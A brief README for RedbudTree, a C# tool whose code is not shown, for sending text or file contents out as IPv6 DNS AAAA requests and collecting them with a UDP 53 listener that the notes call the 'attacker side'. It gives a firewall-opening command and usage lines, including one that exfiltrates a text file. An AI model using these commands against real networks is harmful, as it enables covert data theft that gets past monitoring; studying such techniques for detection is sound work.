# RedbudTree
DNS IPv6 Request Listener (UDP Port 53) for Detecting Exfiltration DATA via IPv6 DNS AAAA Record Requests

i will Publish this C# Code and article for this tool soon

step 1:         
/// for using "Listener Mode" UDP Port 53 should be opened before using this tool.         
/// windows command for opening UDP port 53 is :  
/// netsh advfirewall firewall add rule name="UDP 53" dir=in action=allow protocol=UDP localport=53

Note: step 1 is ((Dumping DATA via IPv6 Requests , attacker side))

step 2:         
/// Compiling C# Code.         
/// windows command for this is :  
/// csc.exe /out:RedbudTree.exe  RedbudTree.cs 


step 3:         
/// RedbudTree.exe Help         
/// windows command for this is :  

/// Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup.         
/// Syntax 1: RedbudTree.exe "AAAA" "Text"  
/// Example1: RedbudTree.exe AAAA "this is my test" 

/// Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files.         
/// Syntax 2: RedbudTree.exe "AAAA" "FILE" "TextFile.txt"  
/// Example2: RedbudTree.exe AAAA FILE "TextFile.txt" 

/// Syntax 3: RedbudTree with Listening Mode          
/// Syntax 3: RedbudTree.exe  
Note: syntax 3 is ((Dumping DATA via IPv6 Requests , attacker side))


